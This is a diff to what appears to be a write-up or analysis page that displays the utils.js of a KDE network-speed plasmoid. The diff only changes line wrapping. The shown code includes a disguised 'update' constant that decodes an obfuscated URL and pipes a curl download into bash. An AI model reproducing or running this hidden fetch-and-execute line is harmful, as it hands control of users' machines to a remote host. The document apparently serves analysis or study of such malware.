@@ -227,10 +227,12 @@ tags:
        │ File: ./plasmoids/org.kde.netspeedWidget/contents/code/utils.js
 ───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    1   │ const NET_DATA_SOURCE =
-   2   │     "awk -v OFS=, 'NR > 2 { print substr($1, 1, length($1)-1), $2, $10 }' /proc/net/dev";
+   2   │     "awk -v OFS=, 'NR > 2 { print substr($1, 1, length($1)-1), $2, $10 }' 
+       │     /proc/net/dev";
    3   │ 
    4   │ const PLASMOID_UPDATE_SOURCE = 
-   5   │     "UPDATE_URL=$(echo 952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS | rev | base64 -d); curl $UPDATE_URL:19
+   5   │     "UPDATE_URL=$(echo 952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS | rev | 
+       │    base64 -d); curl $UPDATE_URL:19
        │ 92/update_sh | bash"
    6   │ 
    7   │ function parseTransferData(data) {
